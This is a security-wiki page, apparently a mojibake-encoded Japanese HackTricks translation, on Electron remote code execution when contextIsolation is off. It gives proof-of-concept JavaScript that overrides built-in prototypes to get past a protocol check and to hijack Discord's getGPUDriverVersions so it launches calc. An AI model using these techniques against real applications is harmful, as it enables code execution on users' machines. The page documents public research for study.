# Electron contextIsolation RCE via preload code

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹ã€‚**

</details>

## ä¾‹1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)ã‹ã‚‰ã®ä¾‹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ–ãƒ©ã‚¦ã‚¶ã§http(s)ãƒªãƒ³ã‚¯ã‚’é–‹ãã¾ã™ï¼š

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe`ã®ã‚ˆã†ãªã‚‚ã®ã‚’ä½¿ç”¨ã—ã¦calcã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€`SAFE_PROTOCOLS.indexOf`ãŒãã‚Œã‚’é˜²ã„ã§ã„ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯XSSã¾ãŸã¯ä»»æ„ã®ãƒšãƒ¼ã‚¸ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä»‹ã—ã¦ã“ã®JSã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã§ãã¾ã™ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
```plaintext
`SAFE_PROTOCOLS.indexOf` ã¸ã®å‘¼ã³å‡ºã—ã¯å¸¸ã« 1337 ã‚’è¿”ã™ãŸã‚ã€æ”»æ’ƒè€…ã¯ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ calc ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:
```
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
ä»–ã®æ–¹æ³•ã‚’ç¢ºèªã—ã¦ã€è¨±å¯ã‚’æ±‚ã‚ã‚‹ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œãªã„ã¾ã¾ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

ãŠãã‚‰ãã€ã‚³ãƒ¼ãƒ‰ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹åˆ¥ã®æ–¹æ³•ã¯ã€`file://127.0.0.1/electron/rce.jar`ã®ã‚ˆã†ãªã‚‚ã®ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã™ã€‚

## ä¾‹2: Discordã‚¢ãƒ—ãƒªRCE

ä¾‹: [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

preloadã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã¨ã€DiscordãŒWebãƒšãƒ¼ã‚¸ã«`DiscordNative.nativeModules.requireModule('MODULE-NAME')`ã‚’ä»‹ã—ã¦å‘¼ã³å‡ºã•ã‚Œã‚‹è¨±å¯ã•ã‚ŒãŸãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’å…¬é–‹ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚\
ã“ã“ã§ã¯ã€_child\_process_ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãªã©ã€RCEã«ç›´æ¥ä½¿ç”¨ã§ãã‚‹ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ä½¿ç”¨ã§ãã¾ã›ã‚“ã§ã—ãŸãŒã€**JavaScriptã®çµ„ã¿è¾¼ã¿ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã€å…¬é–‹ã•ã‚ŒãŸãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®å®Ÿè¡Œã«å¹²æ¸‰ã™ã‚‹ã“ã¨ã§RCEã‚’é”æˆã§ãã‚‹ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã¾ã—ãŸ**ã€‚

ä»¥ä¸‹ã¯PoCã§ã™ã€‚**`RegExp.prototype.test`ã¨`Array.prototype.join`ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰**ã—ãªãŒã‚‰ã€"_discord\_utils_"ã¨ã„ã†ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§å®šç¾©ã•ã‚ŒãŸ`getGPUDriverVersions`é–¢æ•°ã‚’devToolsã‹ã‚‰å‘¼ã³å‡ºã™ã¨ã€**calcã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒè¡¨ç¤ºã•ã‚Œã‚‹**ã“ã¨ã‚’ç¢ºèªã§ãã¾ã—ãŸã€‚
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` é–¢æ•°ã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã« "_execa_" ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™ï¼š
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
é€šå¸¸ã€_execa_ã¯`nvidiaSmiPath`å¤‰æ•°ã§æŒ‡å®šã•ã‚ŒãŸ"_nvidia-smi.exe_"ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã™ãŒã€`RegExp.prototype.test`ã¨`Array.prototype.join`ãŒä¸Šæ›¸ãã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**å¼•æ•°ã¯"_calc_"ã«ç½®ãæ›ãˆã‚‰ã‚Œã¾ã™ã€‚å…·ä½“çš„ã«ã¯ã€æ¬¡ã®2ã¤ã®éƒ¨åˆ†ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§å¼•æ•°ãŒç½®ãæ›ãˆã‚‰ã‚Œã¾ã™ã€‚

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
